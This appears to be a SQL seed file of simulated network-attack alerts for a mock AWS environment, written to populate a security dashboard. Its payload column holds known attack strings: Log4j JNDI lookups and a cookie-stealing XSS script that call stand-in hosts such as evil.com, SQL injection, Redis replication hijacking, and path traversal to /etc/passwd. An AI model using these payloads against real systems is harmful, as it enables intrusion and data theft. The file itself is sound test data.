-- =====================================================
-- 模拟数据: alert_network_attack (网络攻击告警表)
-- 数据量: 35条
-- 说明: AWS ap-southeast-1 (Singapore) 区域 EC2 实例
-- VPC CIDR: 10.0.0.0/16
-- 子网划分:
--   10.0.1.x  Web/API 层 (公有子网)
--   10.0.2.x  应用层 (私有子网)
--   10.0.3.x  数据层 (私有子网)
--   10.0.4.x  EKS/K8s 层 (私有子网)
--   10.0.5.x  DevOps 层 (私有子网)
--   10.0.6.x  监控层 (私有子网)
--   10.0.7.x  基础设施/安全层 (私有子网)
-- OS: Ubuntu 22.04/20.04, Amazon Linux 2/2023 (无 Windows)
-- =====================================================

INSERT INTO alert_network_attack (agent_id, host_id, host_name, host_ip, target_port, attacker_ip, attacker_location, attacker_country, vulnerability_name, vulnerability_id, attack_status, attack_count, first_attack_time, last_attack_time, attack_payload, status, created_at, updated_at) VALUES
-- Log4j漏洞攻击
('agent-005-q7r8s9t0', 5, 'aws-gateway-01', '10.0.1.30', 8080, '45.33.32.156', '美国 加利福尼亚州', '美国', 'Apache Log4j2 远程代码执行漏洞', 'CVE-2021-44228', 'attempted', 156, NOW() - INTERVAL '2 days', NOW() - INTERVAL '30 minutes', '${jndi:ldap://evil.com/exploit}', 0, NOW() - INTERVAL '30 minutes', NOW()),
('agent-006-u1v2w3x4', 6, 'aws-app-01', '10.0.2.10', 8080, '185.220.101.35', '德国 柏林', '德国', 'Apache Log4j2 远程代码执行漏洞', 'CVE-2021-44228', 'attempted', 89, NOW() - INTERVAL '1 day', NOW() - INTERVAL '2 hours', '${jndi:rmi://attacker.io/shell}', 0, NOW() - INTERVAL '2 hours', NOW()),
('agent-028-e9f0g1h2', 30, 'aws-jenkins-01', '10.0.5.10', 8080, '91.121.87.18', '法国 巴黎', '法国', 'Apache Log4j2 远程代码执行漏洞', 'CVE-2021-44228', 'blocked', 234, NOW() - INTERVAL '3 days', NOW() - INTERVAL '1 hour', '${jndi:ldap://${env:HOSTNAME}.callback.evil}', 1, NOW() - INTERVAL '1 hour', NOW()),
('agent-016-i1j2k3l4', 16, 'aws-es-01', '10.0.3.30', 9200, '45.155.205.233', '俄罗斯 莫斯科', '俄罗斯', 'Apache Log4j2 远程代码执行漏洞', 'CVE-2021-44228', 'attempted', 67, NOW() - INTERVAL '12 hours', NOW() - INTERVAL '3 hours', '${${lower:j}ndi:${lower:l}dap://x.x}', 0, NOW() - INTERVAL '3 hours', NOW()),

-- Spring框架漏洞
('agent-005-q7r8s9t0', 5, 'aws-gateway-01', '10.0.1.30', 8080, '103.25.61.114', '中国 北京', '中国', 'Spring Framework RCE漏洞', 'CVE-2022-22965', 'attempted', 45, NOW() - INTERVAL '1 day', NOW() - INTERVAL '4 hours', 'class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di', 0, NOW() - INTERVAL '4 hours', NOW()),
('agent-006-u1v2w3x4', 6, 'aws-app-01', '10.0.2.10', 8080, '195.154.181.128', '法国 巴黎', '法国', 'Spring Cloud Gateway RCE漏洞', 'CVE-2022-22947', 'blocked', 23, NOW() - INTERVAL '2 days', NOW() - INTERVAL '6 hours', 'filters: - AddResponseHeader=Result,#{T(java.lang.Runtime).getRuntime().exec("id")}', 1, NOW() - INTERVAL '6 hours', NOW()),

-- SQL注入攻击
('agent-001-a1b2c3d4', 1, 'aws-web-01', '10.0.1.10', 80, '91.240.118.172', '乌克兰 基辅', '乌克兰', 'SQL注入漏洞', NULL, 'attempted', 567, NOW() - INTERVAL '5 days', NOW() - INTERVAL '1 hour', 'id=1'' OR ''1''=''1'' -- ', 0, NOW() - INTERVAL '1 hour', NOW()),
('agent-002-e5f6g7h8', 2, 'aws-web-02', '10.0.1.11', 443, '45.143.220.115', '美国 纽约', '美国', 'SQL注入漏洞', NULL, 'attempted', 234, NOW() - INTERVAL '3 days', NOW() - INTERVAL '2 hours', 'username=admin''; DROP TABLE users;--', 0, NOW() - INTERVAL '2 hours', NOW()),
('agent-001-a1b2c3d4', 1, 'aws-web-01', '10.0.1.10', 80, '23.129.64.130', '美国 西雅图', '美国', 'SQL注入漏洞(时间盲注)', NULL, 'blocked', 345, NOW() - INTERVAL '2 days', NOW() - INTERVAL '5 hours', 'id=1 AND SLEEP(5)--', 1, NOW() - INTERVAL '5 hours', NOW()),

-- XSS攻击
('agent-001-a1b2c3d4', 1, 'aws-web-01', '10.0.1.10', 80, '103.74.192.18', '印度 新德里', '印度', 'XSS跨站脚本攻击', NULL, 'attempted', 123, NOW() - INTERVAL '1 day', NOW() - INTERVAL '3 hours', '<script>document.location=''http://evil.com/steal?c=''+document.cookie</script>', 0, NOW() - INTERVAL '3 hours', NOW()),
('agent-002-e5f6g7h8', 2, 'aws-web-02', '10.0.1.11', 443, '185.161.248.12', '俄罗斯 莫斯科', '俄罗斯', 'XSS跨站脚本攻击', NULL, 'attempted', 78, NOW() - INTERVAL '8 hours', NOW() - INTERVAL '4 hours', '<img src=x onerror=alert(1)>', 0, NOW() - INTERVAL '4 hours', NOW()),

-- Apache Struts漏洞
('agent-005-q7r8s9t0', 5, 'aws-gateway-01', '10.0.1.30', 8080, '61.177.173.25', '中国 江苏', '中国', 'Apache Struts2 S2-057 RCE漏洞', 'CVE-2018-11776', 'attempted', 34, NOW() - INTERVAL '4 days', NOW() - INTERVAL '8 hours', '${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[''struts.valueStack''])}', 0, NOW() - INTERVAL '8 hours', NOW()),

-- Redis未授权访问
('agent-014-a3b4c5d6', 14, 'aws-redis-01', '10.0.3.20', 6379, '222.186.30.112', '中国 上海', '中国', 'Redis未授权访问', NULL, 'success', 12, NOW() - INTERVAL '6 hours', NOW() - INTERVAL '1 hour', 'CONFIG SET dir /var/spool/cron', 0, NOW() - INTERVAL '1 hour', NOW()),
('agent-015-e7f8g9h0', 15, 'aws-redis-02', '10.0.3.21', 6379, '119.45.227.38', '中国 广东', '中国', 'Redis未授权访问', NULL, 'attempted', 45, NOW() - INTERVAL '2 days', NOW() - INTERVAL '5 hours', 'SLAVEOF evil.com 6379', 1, NOW() - INTERVAL '5 hours', NOW()),

-- MySQL远程代码执行
('agent-011-o1p2q3r4', 11, 'aws-mysql-01', '10.0.3.10', 3306, '103.153.78.45', '越南 河内', '越南', 'MySQL Client任意文件读取', 'CVE-2018-18282', 'attempted', 23, NOW() - INTERVAL '1 day', NOW() - INTERVAL '6 hours', 'LOCAL INFILE read /etc/passwd', 0, NOW() - INTERVAL '6 hours', NOW()),

-- Elasticsearch漏洞
('agent-016-i1j2k3l4', 16, 'aws-es-01', '10.0.3.30', 9200, '45.227.255.99', '巴西 圣保罗', '巴西', 'Elasticsearch远程代码执行', 'CVE-2014-3120', 'blocked', 56, NOW() - INTERVAL '3 days', NOW() - INTERVAL '4 hours', '{"script":"java.lang.Runtime.getRuntime().exec(\"id\")"}', 1, NOW() - INTERVAL '4 hours', NOW()),
('agent-017-m5n6o7p8', 17, 'aws-es-02', '10.0.3.31', 9200, '185.220.100.252', '德国 法兰克福', '德国', 'Elasticsearch目录遍历', 'CVE-2015-5531', 'attempted', 34, NOW() - INTERVAL '2 days', NOW() - INTERVAL '7 hours', '/_plugin/head/../../../../../../../etc/passwd', 0, NOW() - INTERVAL '7 hours', NOW()),

-- Nginx漏洞
('agent-001-a1b2c3d4', 1, 'aws-web-01', '10.0.1.10', 80, '58.218.198.160', '中国 江苏', '中国', 'Nginx配置错误导致目录遍历', NULL, 'attempted', 89, NOW() - INTERVAL '1 day', NOW() - INTERVAL '2 hours', '/files../etc/passwd', 0, NOW() - INTERVAL '2 hours', NOW()),

-- WebLogic漏洞
('agent-005-q7r8s9t0', 5, 'aws-gateway-01', '10.0.1.30', 7001, '185.156.73.54', '荷兰 阿姆斯特丹', '荷兰', 'WebLogic反序列化RCE漏洞', 'CVE-2020-14882', 'attempted', 45, NOW() - INTERVAL '5 days', NOW() - INTERVAL '10 hours', '/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&handle=com.tangosol', 0, NOW() - INTERVAL '10 hours', NOW()),

-- Tomcat漏洞
('agent-028-e9f0g1h2', 30, 'aws-jenkins-01', '10.0.5.10', 8080, '103.75.190.11', '印度 孟买', '印度', 'Apache Tomcat AJP文件读取', 'CVE-2020-1938', 'attempted', 67, NOW() - INTERVAL '2 days', NOW() - INTERVAL '3 hours', 'AJP协议请求读取/WEB-INF/web.xml', 0, NOW() - INTERVAL '3 hours', NOW()),

-- OpenSSH/Apache漏洞
('agent-039-w3x4y5z6', 41, 'aws-bastion-01', '10.0.7.11', 22, '91.121.87.18', '法国 巴黎', '法国', 'OpenSSH远程代码执行漏洞(regreSSHion)', 'CVE-2024-6387', 'blocked', 234, NOW() - INTERVAL '4 days', NOW() - INTERVAL '2 hours', 'OpenSSH regreSSHion Race Condition Exploit', 1, NOW() - INTERVAL '2 hours', NOW()),
('agent-038-s9t0u1v2', 40, 'aws-vpn-01', '10.0.7.10', 80, '45.155.205.233', '俄罗斯 莫斯科', '俄罗斯', 'Apache HTTP Server路径遍历漏洞', 'CVE-2021-41773', 'attempted', 56, NOW() - INTERVAL '1 day', NOW() - INTERVAL '5 hours', 'GET /cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd', 0, NOW() - INTERVAL '5 hours', NOW()),

-- Postfix/Nginx漏洞
('agent-042-i5j6k7l8', 44, 'aws-mail-01', '10.0.7.14', 25, '195.154.181.128', '法国 巴黎', '法国', 'Postfix SMTP走私漏洞', 'CVE-2023-51764', 'attempted', 89, NOW() - INTERVAL '3 days', NOW() - INTERVAL '4 hours', 'Postfix SMTP Smuggling邮件伪造', 0, NOW() - INTERVAL '4 hours', NOW()),
('agent-042-i5j6k7l8', 44, 'aws-mail-01', '10.0.7.14', 443, '103.25.61.114', '中国 北京', '中国', 'Nginx配置注入远程代码执行', 'CVE-2021-23017', 'blocked', 45, NOW() - INTERVAL '2 days', NOW() - INTERVAL '6 hours', 'Nginx DNS Resolver Off-By-One写入WebShell', 1, NOW() - INTERVAL '6 hours', NOW()),

-- SSH漏洞
('agent-023-k9l0m1n2', 25, 'aws-eks-master-01', '10.0.4.10', 22, '185.220.101.35', '德国 柏林', '德国', 'OpenSSH用户名枚举漏洞', 'CVE-2018-15473', 'attempted', 345, NOW() - INTERVAL '1 day', NOW() - INTERVAL '1 hour', 'SSH用户枚举', 0, NOW() - INTERVAL '1 hour', NOW()),

-- Kubernetes API漏洞
('agent-023-k9l0m1n2', 25, 'aws-eks-master-01', '10.0.4.10', 6443, '91.240.118.172', '乌克兰 基辅', '乌克兰', 'Kubernetes API未授权访问', NULL, 'attempted', 23, NOW() - INTERVAL '8 hours', NOW() - INTERVAL '2 hours', 'GET /api/v1/namespaces/kube-system/secrets', 0, NOW() - INTERVAL '2 hours', NOW()),
('agent-024-o3p4q5r6', 26, 'aws-eks-node-01', '10.0.4.11', 10250, '45.143.220.115', '美国 纽约', '美国', 'Kubelet未授权访问', 'CVE-2018-1002105', 'blocked', 34, NOW() - INTERVAL '2 days', NOW() - INTERVAL '5 hours', 'Kubelet API RCE', 1, NOW() - INTERVAL '5 hours', NOW()),

-- Jenkins漏洞
('agent-028-e9f0g1h2', 30, 'aws-jenkins-01', '10.0.5.10', 8080, '222.186.30.112', '中国 上海', '中国', 'Jenkins Script Console未授权访问', NULL, 'attempted', 12, NOW() - INTERVAL '6 hours', NOW() - INTERVAL '3 hours', 'println "whoami".execute().text', 0, NOW() - INTERVAL '3 hours', NOW()),

-- GitLab漏洞
('agent-029-i3j4k5l6', 31, 'aws-gitlab-01', '10.0.5.11', 443, '185.161.248.12', '俄罗斯 莫斯科', '俄罗斯', 'GitLab远程代码执行漏洞', 'CVE-2021-22205', 'attempted', 56, NOW() - INTERVAL '3 days', NOW() - INTERVAL '4 hours', 'ExifTool DjVu文件RCE', 0, NOW() - INTERVAL '4 hours', NOW()),

-- LDAP注入
('agent-043-m9n0o1p2', 45, 'aws-ldap-01', '10.0.7.15', 389, '103.74.192.18', '印度 新德里', '印度', 'LDAP注入攻击', NULL, 'attempted', 34, NOW() - INTERVAL '1 day', NOW() - INTERVAL '7 hours', '(&(uid=*)(userPassword=*))', 0, NOW() - INTERVAL '7 hours', NOW()),

-- FTP漏洞
('agent-046-y1z2a3b4', 48, 'aws-ftp-01', '10.0.7.18', 21, '61.177.173.25', '中国 江苏', '中国', 'ProFTPd mod_copy任意文件复制', 'CVE-2015-3306', 'attempted', 23, NOW() - INTERVAL '2 days', NOW() - INTERVAL '8 hours', 'SITE CPFR /etc/passwd', 0, NOW() - INTERVAL '8 hours', NOW()),

-- Harbor漏洞
('agent-030-m7n8o9p0', 32, 'aws-harbor-01', '10.0.5.12', 443, '119.45.227.38', '中国 广东', '中国', 'Harbor权限提升漏洞', 'CVE-2019-16097', 'attempted', 12, NOW() - INTERVAL '4 days', NOW() - INTERVAL '6 hours', '创建管理员账户API', 0, NOW() - INTERVAL '6 hours', NOW());
